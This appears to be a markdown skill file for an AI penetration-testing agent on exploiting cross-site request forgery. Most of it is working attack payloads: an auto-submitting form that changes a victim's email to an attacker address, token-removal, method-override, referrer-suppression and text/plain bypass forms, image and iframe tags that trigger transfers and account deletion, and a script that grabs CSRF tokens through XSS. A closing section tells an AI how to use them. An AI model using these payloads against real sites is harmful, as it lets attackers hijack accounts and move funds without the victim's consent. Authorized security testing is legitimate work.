# Cross-Site Request Forgery (CSRF) Skill

## Goal

Identify and exploit CSRF vulnerabilities to make authenticated users perform unintended actions.

## Methodology

1. **Identify State-Changing Requests:** Find actions that modify data (password change, email update, transfers)
2. **Check for CSRF Protections:** Examine tokens, SameSite cookies, Origin/Referer validation
3. **Bypass Protections:** Test token removal, method override, referrer suppression
4. **Craft Exploit:** Create malicious HTML page to trigger the forged request
5. **Deliver Payload:** Host exploit and trick victim into visiting

## Basic CSRF PoC

```html
<!-- Auto-submitting form -->
<html>
<body>
  <form action="https://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

## Bypass Techniques

### Token Removal
```html
<!-- Simply remove the CSRF token parameter -->
<form action="https://target.com/api" method="POST">
  <input name="data" value="malicious" />
</form>
```

### Method Override
```html
<!-- POST with _method override for DELETE/PUT endpoints -->
<form action="https://target.com/user/delete" method="POST">
  <input type="hidden" name="_method" value="DELETE" />
  <input type="hidden" name="user_id" value="123" />
</form>
```

### Referrer Suppression
```html
<meta name="referrer" content="never">
<form action="https://target.com/api" method="POST">...</form>
```

### Content-Type Bypass
```html
<!-- Send JSON as text/plain to avoid preflight -->
<form action="https://target.com/api" method="POST" enctype="text/plain">
  <input name='{"user":"admin","action":"delete","ignore":"' value='"}' />
</form>
```

## GET-Based CSRF

```html
<img src="https://target.com/transfer?to=attacker&amount=1000" />
<iframe src="https://target.com/delete-account?confirm=1"></iframe>
```

## Token Stealing via XSS

```javascript
// If XSS exists, steal CSRF token first
var token = document.querySelector('input[name="csrf_token"]').value;
fetch('/api/action', {
  method: 'POST',
  body: 'csrf_token=' + token + '&action=malicious',
  credentials: 'include'
});
```

## Tools

* **Burp Suite** - Generate CSRF PoC automatically
* **OWASP CSRFTester** - CSRF testing tool
* **Browser DevTools** - Inspect cookies and headers

## Guidance for AI

* Activate when testing forms or API endpoints that perform state-changing actions
* First check if CSRF tokens are present and properly validated
* Test token removal, empty token value, and token from different session
* Check SameSite cookie attribute (Lax still allows GET-based CSRF)
* For JSON APIs, try Content-Type bypass with text/plain
* Login CSRF can force victim into attacker's account
* CSRF + XSS combination can steal tokens for protected endpoints
